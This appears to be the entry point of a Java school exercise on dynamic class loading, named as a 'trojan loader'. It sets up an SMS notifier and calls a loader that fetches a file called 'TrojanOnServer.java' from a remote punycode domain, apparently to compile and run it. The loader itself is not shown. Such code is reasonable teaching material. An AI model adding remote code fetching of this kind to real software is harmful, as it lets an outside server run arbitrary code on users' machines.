package com.sbt.javaschool.rnd.lesson7trojanloader;

import com.sbt.javaschool.rnd.lesson7trojanloader.loaders.AllLoadersInterface;
import com.sbt.javaschool.rnd.lesson7trojanloader.loaders.TrojanFromRemoteServerLoader;
import com.sbt.javaschool.rnd.lesson7trojanloader.sms.SmsRuSender;

public class Main {
    public static void main(String[] args) {
        SmsRuSender s= new SmsRuSender();
        //s.InformAboutLoading("Hi");
        AllLoadersInterface loader = new TrojanFromRemoteServerLoader();
        loader.load("http://xn--80aalwafjm2a3l.xn--p1ai/TrojanOnServer.java");
    }
}
